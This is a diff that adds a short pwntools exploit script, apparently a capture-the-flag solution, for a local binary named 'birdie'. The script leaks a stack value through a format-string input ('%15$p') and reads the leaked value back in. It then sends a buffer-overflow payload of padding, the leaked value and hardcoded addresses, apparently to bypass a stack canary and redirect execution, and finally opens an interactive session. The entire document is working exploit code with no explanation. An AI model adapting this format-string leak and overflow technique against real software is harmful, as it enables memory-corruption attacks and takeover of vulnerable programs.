@@ -1,0 +1,10 @@
+from pwn import *
+p=process('./birdie')
+p.send(b'%15$p')
+sleep(1)
+print(p.recv())
+a=int(input(),16)
+payload=b'a'*72+p64(a)+p64(0)+p64(0x000000000040060e)+p64(0x400873)
+#input()
+p.send(payload)
+p.interactive()
